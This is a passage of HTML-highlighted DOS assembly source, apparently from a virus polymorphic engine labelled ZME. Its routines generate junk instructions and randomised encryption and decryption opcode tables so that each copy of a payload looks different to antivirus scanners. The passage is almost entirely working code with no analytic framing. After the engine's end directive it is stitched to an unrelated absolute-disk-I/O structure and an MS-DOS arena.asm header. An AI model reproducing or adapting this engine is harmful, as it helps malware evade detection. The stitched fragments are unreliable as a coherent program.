            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
                </span><span class="sc5">sto_byte</span><span class="sc0">   </span><span class="sc5">opSEGES</span><span class="sc0"> </span><span class="sc1">;seges</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.segm_IDT</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">shit</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;ÄÄ encode test CF after int21 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
</span><span class="sc1">;        jz      @@ret ;maybe :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opJC</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cf_1</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc1">;if instruct &gt; 0A -&gt;  73&lt;=&gt;72</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opJC</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc1">;73(jnc)</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;al=1..8</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">;over shit</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">shit_ax</span><span class="sc0">
        </span><span class="sc5">DOELSE</span><span class="sc0"> </span><span class="sc1">;72(jc)</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">  </span><span class="sc1">; to shit</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">unprotect_reg2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unprotect_reg</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc1">; high byte holds the opcode, low byte holds the second byte of the</span><span class="sc0">
</span><span class="sc1">; instruction, i.e. holds the reg/mod, etc. the bottom 2 bits of the low</span><span class="sc0">
</span><span class="sc1">; byte hold the maximum amount to add to the high byte in creating the</span><span class="sc0">
</span><span class="sc1">; instruction. This allows one word to generate more than one instruction,</span><span class="sc0">
</span><span class="sc1">; including the byte or word forms of the instructions</span><span class="sc0">
</span><span class="sc1">; note that this is reverse of what will be actually stored</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ONEHALF</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TWOHALF</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;USE _ANY_ REGISTER FOR THIS OPERATION</span><span class="sc0">
</span><span class="sc5">BINOP</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;TWO ARGUMENT OPERATION</span><span class="sc0">
</span><span class="sc5">UNEOP</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;ONE ARGUMENT OPERATION</span><span class="sc0">
</span><span class="sc5">ONLY_THIS_OPCODE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00b</span><span class="sc0">
</span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">01b</span><span class="sc0">
</span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dop</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">highopcode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shiftneg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lowpcode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">twohalf</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">secdlim</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">highopcode</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">shiftneg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lowpcode</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">twohalf</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">secdlim</span><span class="sc0">
    </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">garble_table</span><span class="sc0">                       </span><span class="sc1">;for decrypt</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encrypt_opcode_table</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11110000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11011000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³</span><span class="sc0">
                                                  </span><span class="sc1">;³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³Ú</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00110010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00101010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;³³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11101000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">;À³</span><span class="sc0">
                                                  </span><span class="sc1">; ³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11001000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">; ³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11011000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">; ³</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11110000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">   </span><span class="sc1">; ³</span><span class="sc0">
                                                  </span><span class="sc1">; for encrypt</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">end_encrypt_opcode_table</span><span class="sc0">            </span><span class="sc1">;  ^---^^-simetrichno</span><span class="sc0">
</span><span class="sc5">sizeof_encrypt_opcode_table</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">encrypt_opcode_table</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;startup</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">enc_mov_imm</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10110000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10001010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10001010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10001010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00001010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00010010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00011010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00100010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     dop   00111000b,  BINOP,  00000000b,  TWOHALF,  INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">00111010b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">TWOHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
</span><span class="sc1">;     dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE;</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11001000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11011000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11100000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">

</span><span class="sc1">;     dop   10000000b,  BINOP,  11100000b,  ONEHALF,  USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000100b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">TWOHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11001000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11011000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11100000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11101000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11111000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">INCL_NEXT_OPCODE</span><span class="sc0">
</span><span class="sc1">;     dop   11010000b,  UNEOP,  11111000b,  ONEHALF,  INCL_NEXT_OPCODE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">UNEOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11010000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">ONEHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
</span><span class="sc1">;                 ^^ |= (RND and            ^^)</span><span class="sc0">
</span><span class="sc1">;                                       ^ 1 -&gt; use any register &amp; memory</span><span class="sc0">
</span><span class="sc1">;                           ^^ = 0 possible use memory, 11- registers only</span><span class="sc0">
</span><span class="sc1">;                       ^- if 1 then not need arguments(shift, not, neg)</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">enc_test</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">11110110b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">TWOHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
      </span><span class="sc5">dop</span><span class="sc0">   </span><span class="sc2">10000000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BINOP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">11111000b</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">TWOHALF</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">USE_ANY_SIZE</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">onebyte_table</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                  </span><span class="sc1">; |</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                  </span><span class="sc1">; |</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">                  </span><span class="sc1">; |</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">                  </span><span class="sc1">; |</span><span class="sc0">
                </span><span class="sc6">sahf</span><span class="sc0">                 </span><span class="sc1">; |</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">onebyte_table_ax</span><span class="sc0">                    </span><span class="sc1">; |</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                  </span><span class="sc1">;-\
                dec     ax           ; |</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;-/-\
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ|ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
                </span><span class="sc6">lahf</span><span class="sc0">                 </span><span class="sc1">;   |</span><span class="sc0">
                </span><span class="sc6">daa</span><span class="sc0">                  </span><span class="sc1">;   |</span><span class="sc0">
                </span><span class="sc6">das</span><span class="sc0">                  </span><span class="sc1">;   |</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">                  </span><span class="sc1">;   |</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">                 </span><span class="sc1">;  /</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc1">;PMtest db 050h,0B8h,086h,016h,0CDh,02Fh,023h,0C0h,058h,075h,006h,05Fh,055h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">ZME_END</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc1">;read/write int 25/26</span><span class="sc0">
</span><span class="sc5">AbsDiskIORec</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
    </span><span class="sc5">AbsDisk_start_sect</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; lStartSect logical sector no. to start r/w</span><span class="sc0">
    </span><span class="sc5">AbsDisk_sect_num</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; wSectCnt   number of sectors to read/write</span><span class="sc0">
    </span><span class="sc5">AbsDisk_buffer</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; pBuffer    FAR addr of data buffer</span><span class="sc0">
</span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)arena.asm  1.1 85/04/09</span><span class="sc0">
</span><span class="sc1">;BREAK &lt;Memory arena structure&gt;</span><span class="sc0">

</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
